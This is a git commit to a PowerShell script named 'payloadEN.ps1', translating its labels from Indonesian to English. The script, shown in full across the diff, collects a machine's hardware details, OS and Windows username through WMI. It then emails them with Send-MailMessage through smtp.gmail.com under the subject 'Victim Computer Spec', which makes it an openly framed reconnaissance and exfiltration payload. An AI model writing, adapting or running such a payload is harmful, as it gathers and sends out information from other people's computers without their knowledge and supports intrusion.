12aa6f1d3c2b06419a2c06cbaa0f1010d10ca821
faizonly5953 <93267021+faizonly5953@users.noreply.github.com>
2023-02-04 17:48:03 +0700

    Update payloadEN.ps1

--- payloadEN.ps1
+++ payloadEN.ps1
@@ -6,26 +6,26 @@ $operatingSystem = Get-WmiObject Win32_OperatingSystem
 $user = Get-WmiObject Win32_UserAccount | Where-Object {$_.Name -eq $env:username}
 
 $specifications = @{
-    "Nama Komputer" = $computerSystem.Name;
+    "Computer Name" = $computerSystem.Name;
     "Model" = $computerSystem.Model;
     "Processor" = "$($processor.Name) ($($processor.NumberOfCores) cores)";
     "RAM" = "$(( $computerSystem.TotalPhysicalMemory / 1GB )) GB";
-    "Sistem Operasi" = $operatingSystem.Caption;
-    "Kartu Grafis" = $graphicsAdapter.Name;
-    "Penyimpanan" = foreach ($drive in $storage) { "$($drive.DeviceID) ($($drive.Size / 1GB) GB, $($drive.FreeSpace / 1GB) GB tersedia)" };
-    "Nama Akun User Windows" = $user.Name;
+    "OS System" = $operatingSystem.Caption;
+    "Graphics Card" = $graphicsAdapter.Name;
+    "Storage" = foreach ($drive in $storage) { "$($drive.DeviceID) ($($drive.Size / 1GB) GB, $($drive.FreeSpace / 1GB) GB Available)" };
+    "Username Windows" = $user.Name;
 }
 
-$body = "Spesifikasi Komputer:`n"
+$body = "Computer Spec:`n"
 
 foreach ($spec in $specifications.GetEnumerator()) {
     $body += "$($spec.Key): $($spec.Value)`n"
 }
 
-$from = Read-Host -Prompt "Email Pengirim ?"
+$from = Read-Host -Prompt "Sender Mail ?"
 $password = Read-Host -Prompt "Password ?" -AsSecureString
-$to = Read-Host -Prompt "Email Penerima ?"
+$to = Read-Host -Prompt "Receiver Mail ?"
 
 $cred = New-Object System.Management.Automation.PSCredential($from, $password)
 
-Send-MailMessage -From $from -To $to -Subject "Spesifikasi Komputer" -Body $body -SmtpServer "smtp.gmail.com" -Port "587" -UseSsl -Credential $cred
+Send-MailMessage -From $from -To $to -Subject "Victim Computer Spec" -Body $body -SmtpServer "smtp.gmail.com" -Port "587" -UseSsl -Credential $cred
